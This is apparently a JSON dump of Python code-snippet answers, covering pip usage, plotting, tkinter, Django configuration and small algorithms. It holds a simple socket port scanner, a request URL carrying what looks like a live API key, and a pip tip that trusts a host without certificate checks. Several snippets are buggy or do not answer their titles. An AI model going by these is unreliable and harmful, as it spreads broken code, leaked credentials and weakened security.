    "id": 2794,
    "keyword": null,
    "link": null,
    "title": " pip install pandas",
    "description": "pip install pandas\nsudo pip3 install pandas\n# install pandas (basic, if path is not set yet) py -m pip install pandas # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install pandas # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip pandas # if PermissionError: [WinError 5] Access is denied py -m pip install --user pandas # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\npip install pandas \nC:\\> py      -m pip install pandas  %= one of Python on the system =% C:\\> py -2   -m pip install pandas  %= one of Python 2 on the system =% C:\\> py -2.7 -m pip install pandas  %= only for Python 2.7 =% C:\\> py -3   -m pip install pandas  %= one of Python 3 on the system =% C:\\> py -3.6 -m pip install pandas  %= only for Python 3.6 =% \nconda install pandas\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2795,
    "keyword": null,
    "link": null,
    "title": " pip install specific version",
    "description": "# To install a specific version of a package using pip: pip install Package_name==version  # Example: pip install MySQL_python==1.2.2\n# At the time of writing this numpy is in version 1.19.x # This statement below will install numpy version 1.18.1 python -m pip install numpy==1.18.1\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2796,
    "keyword": null,
    "link": null,
    "title": " pip install theano",
    "description": "pip install theano\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2797,
    "keyword": null,
    "link": null,
    "title": " pip install torch error",
    "description": "pip install torch==1.5.0+cpu -f https://download.pytorch.org/whl/torch_stable.html \n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2798,
    "keyword": null,
    "link": null,
    "title": " pip list packages",
    "description": "pip list\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2799,
    "keyword": null,
    "link": null,
    "title": " pip pandas",
    "description": "pip install pandas\npip install pandas \n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2800,
    "keyword": null,
    "link": null,
    "title": " pip pickle",
    "description": "#pip pip install pickle-mixin  #import library import pickle\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2801,
    "keyword": null,
    "link": null,
    "title": " pip uninstall all packages",
    "description": "pip3 freeze | xargs pip3 uninstall -y\npip uninstall -y -r <(pip freeze) \n#Write all modules to a txt file pip freeze > requirements.txt  #Now to remove one by one: pip uninstall -r requirements.txt  #If we want to remove all at once then: pip uninstall -r requirements.txt -y\npip list --format=freeze | %{$_.split('==')[0]} | %{If(($_ -eq \"pip\") -or ($_ -eq \"setuptools\") -or ($_ -eq \"wheel\")) {} Else {$_}} | %{pip uninstall $_ -y}\npip freeze | xargs pip uninstall -y \ntype \"pip freeze\" to get list of all installed packages. Copy all the names into a text file name it pkg.txt then type the following \"pip uninstall -r pkg.txt\" you will be asked to proceed type \"y\" and enter\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2802,
    "keyword": null,
    "link": null,
    "title": " pip upgrade",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \npip --version\npip install Django --upgrade\nimport pkg_resources from subprocess import call  packages = [dist.project_name for dist in pkg_resources.working_set] call(\"pip install --upgrade \" + ' '.join(packages), shell=True) \n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2803,
    "keyword": null,
    "link": null,
    "title": " pip upgrade command",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\npip install  python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2804,
    "keyword": null,
    "link": null,
    "title": " pip version",
    "description": "pip --version\npip -V\n$ pip show Jinja2 --- Name: Jinja2 Version: 2.7.3 Location: /path/to/virtualenv/lib/python2.7/site-packages Requires: markupsafe \npython -m pip download [options] <requirement specifier> [package-index-options] ... python -m pip download [options] -r <requirements file> [package-index-options] ... python -m pip download [options] <vcs project url> ... python -m pip download [options] <local project path> ... python -m pip download [options] <archive url/path> ...  \n\"\"\"to install a python module just use pip command\"\"\" \"\"\"open cmd as administrator and write this command\"\"\" pip install <package-name> \"\"\"for ex. pip install pandas\"\"\" ##before writing command first change environment variable to your pip file location\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2805,
    "keyword": null,
    "link": null,
    "title": " pip version command",
    "description": "pip --version\npip -V\n",
    "reg_date": "2021-10-12T11:32:23.000Z"
  },
  {
    "id": 2806,
    "keyword": null,
    "link": null,
    "title": " pipenv freeze requirements.txt",
    "description": "pipenv lock -r > requirements.txt \npipenv run pip freeze > requirements.txt\n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2807,
    "keyword": null,
    "link": null,
    "title": " placeholder tkinter",
    "description": "from tkinter import *  ui = Tk()  e1 = Entry(ui) e1.insert(0, 'username') e1.pack()  ui.mainloop()\nfrom tkinter import * root = Tk() root.geometry(\"500x500\")  btn_height = Button(root, text=\"50px high\") btn_height.place(height=50, x=200, y=200)  btn_width = Button(root, text=\"60px wide\") btn_width.place(width=60, x=300, y=300)  btn_relheight = Button(root, text=\"Relheight of 0.6\") btn_relheight.place(relheight=0.6)  btn_relwidth= Button(root, text=\"Relwidth of 0.2\") btn_relwidth.place(relwidth=0.2)  btn_relx=Button(root, text=\"Relx of 0.3\") btn_relx.place(relx=0.3)  btn_rely=Button(root, text=\"Rely of 0.7\") btn_rely.place(rely=0.7)  btn_x=Button(root, text=\"X = 400px\") btn_x.place(x=400)  btn_y=Button(root, text=\"Y = 321\") btn_y.place(y=321)  root.mainloop() \n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2808,
    "keyword": null,
    "link": null,
    "title": " play music from python",
    "description": "from playsound import playsound playsound('audio.mp3')\n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2809,
    "keyword": null,
    "link": null,
    "title": " play videos in python",
    "description": "from playsound import playsound playsound('audio.mp3')\nimport numpy as np import cv2  cap = cv2.VideoCapture('vtest.avi')  while(cap.isOpened()):     ret, frame = cap.read()      gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)      cv2.imshow('frame',gray)     if cv2.waitKey(1) & 0xFF == ord('q'):         break  cap.release() cv2.destroyAllWindows() \n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2810,
    "keyword": null,
    "link": null,
    "title": " plot a pandas dataframe matplotlib",
    "description": "import pandas as pd import matplotlib.pyplot as plt df = pd.Dataframe(Data) df.plot(kind='bar',x=\"dataframe_1\",y=\"dataframe_2\") # bar can be replaced by  # scatter or line or even left as default plt.show()\nimport pandas as pd  data = pd.Dataframe(   # Data )  data.plot()\n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2811,
    "keyword": null,
    "link": null,
    "title": " plot function in numpy",
    "description": "import numpy as np  from matplotlib import pyplot as plt   x = np.arange(1,11)  y = 2 * x + 5  plt.title(\"Matplotlib demo\")  plt.xlabel(\"x axis caption\")  plt.ylabel(\"y axis caption\")  plt.plot(x,y)  plt.show()\n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2812,
    "keyword": null,
    "link": null,
    "title": " plot histogram qiskit pycharm",
    "description": "import matplotlib.pyplot as plt  #plot_histogram is from qiskit plot_histogram(probs)  #plt.show() is from matplotlib plt.show()\n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2813,
    "keyword": null,
    "link": null,
    "title": " plot image without axes python",
    "description": "plt.axis('off')\n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2814,
    "keyword": null,
    "link": null,
    "title": " plot roc curve for neural network keras",
    "description": "from sklearn.metrics import roc_curve, auc  history = model.fit(x_train, y_train, validation_data=(         x_test, y_test), epochs=num_of_epochs, batch_size=batch_size, verbose=1)  y_pred = model.predict(x_test).ravel()  nn_fpr_keras, nn_tpr_keras, nn_thresholds_keras = roc_curve(y_test, y_pred) auc_keras = auc(nn_fpr_keras, nn_tpr_keras) plt.plot(nn_fpr_keras, nn_tpr_keras, marker='.', label='Neural Network (auc = %0.3f)' % auc_keras)  \n",
    "reg_date": "2021-10-12T11:32:24.000Z"
  },
  {
    "id": 2815,
    "keyword": null,
    "link": null,
    "title": " plot second y axis matplotlib",
    "description": "#We create a secondary y-axis for the definded column df.plot(secondary_y='name_of_column') plt.show()\nimport numpy as np import matplotlib.pyplot as plt  # Create some mock data t = np.arange(0.01, 10.0, 0.01) data1 = np.exp(t) data2 = np.sin(2 * np.pi * t)  fig, ax1 = plt.subplots()  color = 'tab:red' ax1.set_xlabel('time (s)') ax1.set_ylabel('exp', color=color) ax1.plot(t, data1, color=color) ax1.tick_params(axis='y', labelcolor=color)  ax2 = ax1.twinx()  # instantiate a second axes that shares the same x-axis  color = 'tab:blue' ax2.set_ylabel('sin', color=color)  # we already handled the x-label with ax1 ax2.plot(t, data2, color=color) ax2.tick_params(axis='y', labelcolor=color)  fig.tight_layout()  # otherwise the right y-label is slightly clipped plt.show() \nimport numpy as np import matplotlib.pyplot as plt x = np.arange(0, 10, 0.1) y1 = 0.05 * x**2 y2 = -1 *y1  fig, ax1 = plt.subplots()  ax2 = ax1.twinx() ax1.plot(x, y1, 'g-') ax2.plot(x, y2, 'b-')  ax1.set_xlabel('X data') ax1.set_ylabel('Y1 data', color='g') ax2.set_ylabel('Y2 data', color='b')  plt.show()\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2816,
    "keyword": null,
    "link": null,
    "title": " plot specific columns pandas",
    "description": "#For one column import matplotlib.pyplot as plt df['Name Of Column'].plot() plt.show() #For Multiple Columns import matplotlib.pyplot as plt df[['Name Of Column1', 'Name Of Column2']].plot() plt.show()\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2817,
    "keyword": null,
    "link": null,
    "title": " plot two axes plotly",
    "description": "import plotly.graph_objects as go from plotly.subplots import make_subplots  # Create figure with secondary y-axis fig = make_subplots(specs=[[{\"secondary_y\": True}]])  # Add traces fig.add_trace(     go.Scatter(x=[1, 2, 3], y=[40, 50, 60], name=\"yaxis data\"),     secondary_y=False, )  fig.add_trace(     go.Scatter(x=[2, 3, 4], y=[4, 5, 6], name=\"yaxis2 data\"),     secondary_y=True, )  # Add figure title fig.update_layout(     title_text=\"Double Y Axis Example\" )  # Set x-axis title fig.update_xaxes(title_text=\"xaxis title\")  # Set y-axes titles fig.update_yaxes(title_text=\"<b>primary</b> yaxis title\", secondary_y=False) fig.update_yaxes(title_text=\"<b>secondary</b> yaxis title\", secondary_y=True, showgrid= False)  fig.show()\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2818,
    "keyword": null,
    "link": null,
    "title": " plot value counta",
    "description": " data['title'].value_counts()[:20].plot(kind='barh')     \n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2819,
    "keyword": null,
    "link": null,
    "title": " plotly color name python",
    "description": "def show_named_plotly_colours():     \"\"\"     function to display to user the colours to match plotly's named     css colours.      Reference:         #https://community.plotly.com/t/plotly-colours-list/11730/3      Returns:         plotly dataframe with cell colour to match named colour name      \"\"\"     s='''         aliceblue, antiquewhite, aqua, aquamarine, azure,         beige, bisque, black, blanchedalmond, blue,         blueviolet, brown, burlywood, cadetblue,         chartreuse, chocolate, coral, cornflowerblue,         cornsilk, crimson, cyan, darkblue, darkcyan,         darkgoldenrod, darkgray, darkgrey, darkgreen,         darkkhaki, darkmagenta, darkolivegreen, darkorange,         darkorchid, darkred, darksalmon, darkseagreen,         darkslateblue, darkslategray, darkslategrey,         darkturquoise, darkviolet, deeppink, deepskyblue,         dimgray, dimgrey, dodgerblue, firebrick,         floralwhite, forestgreen, fuchsia, gainsboro,         ghostwhite, gold, goldenrod, gray, grey, green,         greenyellow, honeydew, hotpink, indianred, indigo,         ivory, khaki, lavender, lavenderblush, lawngreen,         lemonchiffon, lightblue, lightcoral, lightcyan,         lightgoldenrodyellow, lightgray, lightgrey,         lightgreen, lightpink, lightsalmon, lightseagreen,         lightskyblue, lightslategray, lightslategrey,         lightsteelblue, lightyellow, lime, limegreen,         linen, magenta, maroon, mediumaquamarine,         mediumblue, mediumorchid, mediumpurple,         mediumseagreen, mediumslateblue, mediumspringgreen,         mediumturquoise, mediumvioletred, midnightblue,         mintcream, mistyrose, moccasin, navajowhite, navy,         oldlace, olive, olivedrab, orange, orangered,         orchid, palegoldenrod, palegreen, paleturquoise,         palevioletred, papayawhip, peachpuff, peru, pink,         plum, powderblue, purple, red, rosybrown,         royalblue, saddlebrown, salmon, sandybrown,         seagreen, seashell, sienna, silver, skyblue,         slateblue, slategray, slategrey, snow, springgreen,         steelblue, tan, teal, thistle, tomato, turquoise,         violet, wheat, white, whitesmoke, yellow,         yellowgreen         '''     li=s.split(',')     li=[l.replace('\\n','') for l in li]     li=[l.replace(' ','') for l in li]      import pandas as pd     import plotly.graph_objects as go      df=pd.DataFrame.from_dict({'colour': li})     fig = go.Figure(data=[go.Table(       header=dict(         values=[\"Plotly Named CSS colours\"],         line_color='black', fill_color='white',         align='center', font=dict(color='black', size=14)       ),       cells=dict(         values=[df.colour],         line_color=[df.colour], fill_color=[df.colour],         align='center', font=dict(color='black', size=11)       ))     ])      fig.show() \n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2820,
    "keyword": null,
    "link": null,
    "title": " plotly line plot with title and axis title",
    "description": "import plotly.graph_objects as go  # Add data month = ['January', 'February', 'March', 'April', 'May', 'June', 'July',          'August', 'September', 'October', 'November', 'December']           high_2014 = [28.8, 28.5, 37.0, 56.8, 69.7, 79.7, 78.5, 77.8, 74.1, 62.6, 45.3, 39.9]  fig = go.Figure() # Create and style traces fig.add_trace(go.Scatter(x=month, y=high_2014, name='High 2014'))  # Edit the layout fig.update_layout(title='<b>Title</b>',                    xaxis_title='<b>x</b>',                    yaxis_title='<b>y</b>')   fig.show()\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2821,
    "keyword": null,
    "link": null,
    "title": " plotly not showing in jupyter",
    "description": "import plotly.offline as pyo pyo.init_notebook_mode()\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2822,
    "keyword": null,
    "link": null,
    "title": " plotly stack",
    "description": "from plotly.subplots import make_subplots import plotly.graph_objects as go  fig = make_subplots(rows=len(df.columns), cols=1)  for i in len(df.columns):   fig.append_trace(go.Scatter(       x=[3, 4, 5],       y=[1000, 1100, 1200],   ), row=i+1, col=1)  # Edit the layout fig.update_layout(height=600, width=600, title_text=\"Stacked Subplots\") fig.update_layout(title='<b>Title</b>',                    xaxis_title='<b>x</b>',                    yaxis_title='<b>y</b>') fig.show()\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2823,
    "keyword": null,
    "link": null,
    "title": " plt.imshow grayscale",
    "description": "plt.imshow(arr, cmap='gray', vmin=0, vmax=255)\nplt.imshow(im, cmap='gray')\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2824,
    "keyword": null,
    "link": null,
    "title": " plt.plot width line",
    "description": "plt.plot(data,linewidth=4)\n",
    "reg_date": "2021-10-12T11:32:25.000Z"
  },
  {
    "id": 2825,
    "keyword": null,
    "link": null,
    "title": " plt add axis name",
    "description": "from matplotlib import pyplot as plt      fig = plt.figure() plt.plot(data) fig.suptitle('test title', fontsize=20) plt.xlabel('xlabel', fontsize=18) plt.ylabel('ylabel', fontsize=16) fig.savefig('test.jpg')\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2826,
    "keyword": null,
    "link": null,
    "title": " plt equal axis",
    "description": "ax.axis('equal')\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2827,
    "keyword": null,
    "link": null,
    "title": " plt figsize",
    "description": "plt.figure(figsize=(20,10))\n    plt.figure(figsize=(20,8))\nimport matplotlib.pyplot as plt  plt.figure(figsize=(14,7))  plt.bar(x,y)   # if you have plotted you graph directly using dataframe like this &darr; data.plot(kind='bar')  # then use this plt.rcParams[\"figure.figsize\"] = (14,7)  \n# figsize is an optional parameter in matplotlib.pyplot library's .figure() function # it defaults to = None # syntax: # \tfigsize=(width, height) #\t\t- each integer much be a float  import matplotlib.pyplot as plt  figure = plt.figure(figsize = (10,5));\nplt.figure(figsize=(14,7))\nfrom matplotlib.pyplot import figure figure(num=None, figsize=(8, 6), dpi=80, facecolor='w', edgecolor='k')\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2828,
    "keyword": null,
    "link": null,
    "title": " plt subplots figsize",
    "description": "f, axs = plt.subplots(2,2,figsize=(15,15))\nfig, ax = plt.subplots(10,4, figsize=(16,40))\nf, (a0, a1) = plt.subplots(1, 2, gridspec_kw={'width_ratios': [3, 1]})\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2829,
    "keyword": null,
    "link": null,
    "title": " plt tight layout",
    "description": "fig, ax = plt.subplots() example_plot(ax, fontsize=24) plt.tight_layout() \n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2830,
    "keyword": null,
    "link": null,
    "title": " plt vertical line",
    "description": "plt.axvline(x=0.22058956)\nxposition = [0.3, 0.4, 0.45] for xc in xposition:     plt.axvline(x=xc, color='k', linestyle='--')\n pythonCopymatplotlib.pyplot.axvline(x=0, ymin=0, ymax=1, hold=None, **kwargs)\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2831,
    "keyword": null,
    "link": null,
    "title": " poetry take the dependencies from requirement.txt",
    "description": "$ cat requirements.txt|xargs poetry add \npoetry add `cat requirements.txt` \n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2832,
    "keyword": null,
    "link": null,
    "title": " polynomial features random forest classifier",
    "description": "pd.read_csv()\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2833,
    "keyword": null,
    "link": null,
    "title": " polynomial in python",
    "description": "def p(x):     return x**4 - 4*x**2 + 3*x   for x in [-1, 0, 2, 3.4]:     print(x, p(x))  #-1 -6 #0 0 #2 6 #3.4 97.59359999999998\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2834,
    "keyword": null,
    "link": null,
    "title": " popups in tkinter",
    "description": "from tkinter import messagebox messagebox.showinfo(title=\"Error\", message=\"No Data File Found.\")\nimport tkinter as tk  def popupmsg(msg, title):     root = tk.Tk()     root.title(title)     label = ttk.Label(root, text=msg)     label.pack(side=\"top\", fill=\"x\", pady=10)     B1 = tk.Button(root, text=\"Okay\", command = root.destroy)     B1.pack()     popup.mainloop()\n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2835,
    "keyword": null,
    "link": null,
    "title": " portscan with python",
    "description": "import socket host = \"localhost\" ports = [21,22,23,24,25,110,80,443] # Add Port for port in ports:   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   p = s.connect_ex((host,port))   if p == 0:     print(f\"Port: {port} Open!\")   else:     print(f\"Port: {port} Filter!\") \n",
    "reg_date": "2021-10-12T11:32:26.000Z"
  },
  {
    "id": 2836,
    "keyword": null,
    "link": null,
    "title": " position in alphabet python",
    "description": "from string import ascii_lowercase LETTERS = {letter: str(index) for index, letter in enumerate(ascii_lowercase, start=1)}   def alphabet_position(text):     text = text.lower()     numbers = [LETTERS[character] for character in text if character in LETTERS]     return ' '.join(numbers)\n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2837,
    "keyword": null,
    "link": null,
    "title": " positive lookahead regex python",
    "description": "(?=foo)\tLookahead\tAsserts that what immediately follows the current position in the string is foo (?<=foo)\tLookbehind\tAsserts that what immediately precedes the current position in the string is foo (?!foo)\tNegative Lookahead\tAsserts that what immediately follows the current position in the string is not foo (?<!foo)\tNegative Lookbehind\tAsserts that what immediately precedes the current position in the string is not foo \n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2838,
    "keyword": null,
    "link": null,
    "title": " post has no object memeber in django error",
    "description": "Install Django pylint:  pip install pylint-django ctrl+shift+p > Preferences: Configure Language Specific Settings > Python  The settings.json available for python language should look like the below:  {     \"python.linting.pylintArgs\": [         \"--load-plugins=pylint_django\"     ],      \"[python]\": {      } }\n1. pip install pylint-django 2. or pipenv install pylint-django 3. or pipenv install pylint-django --sequential\n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2839,
    "keyword": null,
    "link": null,
    "title": " postgres django",
    "description": "DATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'your_database_project_name',         'USER': 'your_postgres_username',         'PASSWORD': 'your_postgres_password',         'HOST': '127.0.0.1',         'PORT': '5432',     } }\nDATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql',         'NAME': 'mydatabase',         'USER': 'mydatabaseuser',         'PASSWORD': 'mypassword',         'HOST': '127.0.0.1',         'PORT': '5432',     } } \nenv/scripts/activate\n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2840,
    "keyword": null,
    "link": null,
    "title": " pprint python",
    "description": ">>> import json >>> print json.dumps({'a':2, 'b':{'x':3, 'y':{'t1': 4, 't2':5}}}, ...                  sort_keys=True, indent=4) {     \"a\": 2,     \"b\": {         \"x\": 3,         \"y\": {             \"t1\": 4,             \"t2\": 5         }     } } \n# pprint (aka prettyprint) is a function that allow to print objects in a clearer way # Fist you need to import the pprint module import pprint # then you can create a printer whith whatever arguments you need my_printer = pprint.PrettyPrinter(width=20) # default arguments are : indent=1, width=80, depth=None, stream=None, *, compact=False, sort_dicts=True  # let's take this list as an exemple: list1 = [[0,1,2,3,4],[1,2,3,4,5],[2,3,4,5,6],[3,4,5,6,7]]  print(list1) # will print [[0,1,2,3,4],[1,2,3,4,5],[2,3,4,5,6],[3,4,5,6,7]] my_printer.pprint(list1) # will print: # [[0, 1, 2, 3, 4], #  [1, 2, 3, 4, 5], #  [2, 3, 4, 5, 6], #  [3, 4, 5, 6, 7]]  # You can also formant text whith pprint output = my_printer.pformat(list1) # output will be: \"\"\"[[0, 1, 2, 3, 4],  [1, 2, 3, 4, 5],  [2, 3, 4, 5, 6],  [3, 4, 5, 6, 7]]\"\"\"\nimport pprint  student_dict = {'Name': 'Tusar', 'Class': 'XII',       'Address': {'FLAT ':1308, 'BLOCK ':'A', 'LANE ':2, 'CITY ': 'HYD'}}  print student_dict print \"\\n\" print \"***With Pretty Print***\" print \"-----------------------\" pprint.pprint(student_dict,width=-1) \n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2841,
    "keyword": null,
    "link": null,
    "title": " ppython auto join google meet",
    "description": "import pyautogui import webbrowser import time  # my screen size is 1440, 900, change the coordinates if you have a different window size def morning_join_meet_process_math():     webbrowser.open('') # Meeting link     pyautogui.moveTo(527,652,4)     pyautogui.click() # turn off camera      pyautogui.moveTo(445,640,4)     pyautogui.click() # turn off mic      pyautogui.moveTo(1031,512,4)     pyautogui.click() # join the meet      time.sleep(10)     pyautogui.moveTo(1031,512,4)     pyautogui.click() # double check      time.sleep(5)     pyautogui.moveTo(1192,103,4)     pyautogui.click() # open message      time.sleep(2)     pyautogui.typewrite('Type a message\\n')   while True:     now = time.localtime()     current_time = time.strftime(\"%H:%M:%S\")     if current_time == \"08:30:00\":         morning_join_meet_process_math()         break \n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2842,
    "keyword": null,
    "link": null,
    "title": " predict stock price python",
    "description": "import tensorflow as tf from tensorflow.keras.models import Sequential from tensorflow.keras.layers import LSTM, Dense, Dropout, Bidirectional from tensorflow.keras.callbacks import ModelCheckpoint, TensorBoard from sklearn import preprocessing from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score from yahoo_fin import stock_info as si from collections import deque  import numpy as np import pandas as pd import matplotlib.pyplot as plt import time import os import random\n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2843,
    "keyword": null,
    "link": null,
    "title": " prepend pyhton list",
    "description": "# option 1 s.insert(0, x)  # option 2 new_list = [x] + your_list\n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2844,
    "keyword": null,
    "link": null,
    "title": " presentation in jupyter notebook",
    "description": "jupyter nbconvert Jupyter\\ Slides.ipynb --to slides --post serve\n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2845,
    "keyword": null,
    "link": null,
    "title": " pretty print pandas dataframe",
    "description": "# credit to Stack Overflow user in the source link  from tabulate import tabulate import pandas as pd  df = pd.DataFrame({'col_two' : [0.0001, 1e-005 , 1e-006, 1e-007],                    'column_3' : ['ABCD', 'ABCD', 'long string', 'ABCD']}) print(tabulate(df, headers='keys', tablefmt='psql'))  +----+-----------+-------------+ |    |   col_two | column_3    | |----+-----------+-------------| |  0 |    0.0001 | ABCD        | |  1 |    1e-05  | ABCD        | |  2 |    1e-06  | long string | |  3 |    1e-07  | ABCD        | +----+-----------+-------------+\n",
    "reg_date": "2021-10-12T11:32:27.000Z"
  },
  {
    "id": 2846,
    "keyword": null,
    "link": null,
    "title": " prettytable python",
    "description": "from prettytable import PrettyTable PTables = PrettyTable()  PTables = PrettyTable()     PTables.field_names = [\"Selection No.\", \"Weapon Name\", \"Damage\"]     PTables.add_row([\"0\", \"Fist\", \"1 dp\"])     PTables.add_row([\"1\", \"Knuckle Busters\", \"2.5 dp\"])     PTables.add_row([\"2\", \"Cheap Knife\", \"5 dp\"])     PTables.add_row([\"3\", \"Wooden Baton\", \"6 dp\"])     print(PTables)\nfrom prettytable import PrettyTable A = PrettyTable() A.add_column(\"Pokimon\",[\"wartortle\"]) A.add_column(\"Type\",[\"Water attack\"]) print(A) #look i don't know about these pokimones al lot so this is what i got for you\npip install -U prettytable\nfrom prettytable import PrettyTable PTables = PrettyTable()  PTables = PrettyTable() PTables.field_names = [\"Selection No.\", \"Weapon Name\", \"Damage\"] PTables.add_row([\"0\", \"Fist\", \"1 dp\"]) PTables.add_row([\"1\", \"Knuckle Busters\", \"2.5 dp\"]) PTables.add_row([\"2\", \"Cheap Knife\", \"5 dp\"]) PTables.add_row([\"3\", \"Wooden Baton\", \"6 dp\"]) print(PTables)  \n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2847,
    "keyword": null,
    "link": null,
    "title": " price for bazaar item hypixel python",
    "description": "import requests  data = requests.get( url = \"https://api.hypixel.net/skyblock/bazaar?key=a70af678-ec9f-4aea-b95c-4ea4d88acc08\", ).json() print(data[\"products\"][\"EMERALD\"][\"quick_status\"][\"sellPrice\"])\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2848,
    "keyword": null,
    "link": null,
    "title": " prime factorization python",
    "description": "import math   def primeFactors(n):     # no of even divisibility     while n % 2 == 0:         print(2)         n = n / 2     # n reduces to become odd     for i in range(3, int(math.sqrt(n)) + 1, 2):         # while i divides n         while n % i == 0:             print(i)             n = n / i     # if n is a prime     if n > 2:         print(n)   primeFactors(256)\n# There is no quick way to calculate the prime factors of a number. # In fact, prime factorization is so famously hard that it's what puts the \"asymmetric\" in asymmetric RSA encryption. # That being said, it can be sped up a little bit by using divisibility rules, like checking if the sum of the digits is divisible by 3.  def factors(num):         ps = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149] # Primes from https://primes.utm.edu/lists/small/10000.txt. Primes can also be generated by iterating through numbers and checking for factors, or by using a probabilistic test like Rabin-Miller.         pdict = {}         for p in ps:                 if p <= num:                         while (num / p).is_integer():                                 if str(p) in pdict:                                         pdict[str(p)] += 1                                 else:                                         pdict[str(p)] = 1                                 num /= p                 if num == 1: break         return pdict  # Returns a dictionary in the form {\"base\": \"exponent\"}\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2849,
    "keyword": null,
    "link": null,
    "title": " prime number in python",
    "description": "def prime(num):     if num>1:         s=int(num/2)         for i in range(2,s+1):             if num%i==0:                 return(\"not prime\")                 break         return(\"prime\") print(prime(239)) \nimport math a=[i for i in range(2,int(input('prime number range'))) if 0 not in [i%n for n in range(2,int(math.sqrt(i)))]] print(a)\n# Python program to display all the prime numbers within an interval  lower = 900 upper = 1000  print(\"Prime numbers between\", lower, \"and\", upper, \"are:\")  for num in range(lower, upper + 1):    # all prime numbers are greater than 1    if num > 1:        for i in range(2, num):            if (num % i) == 0:                break        else:            print(num)Copied\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2850,
    "keyword": null,
    "link": null,
    "title": " print() in python",
    "description": "print(\"whatever you want to print\")\nprint(\"Hello World!\")\nprint(\"Hello World\")\nprint(\"hello guys\")\nprint('hi, baby!')\nprint('Welcome to Python!')\n",
    "reg_date": "2021-10-12T11:32:28.000Z"
  },
  {
    "id": 2851,
    "keyword": null,
    "link": null,
    "title": " print(\\'Test set predictions:\\\\n{}\\'.format(y pred))",
    "description": "print('Test set predictions:\\in{}'.format(y_pred))\n",
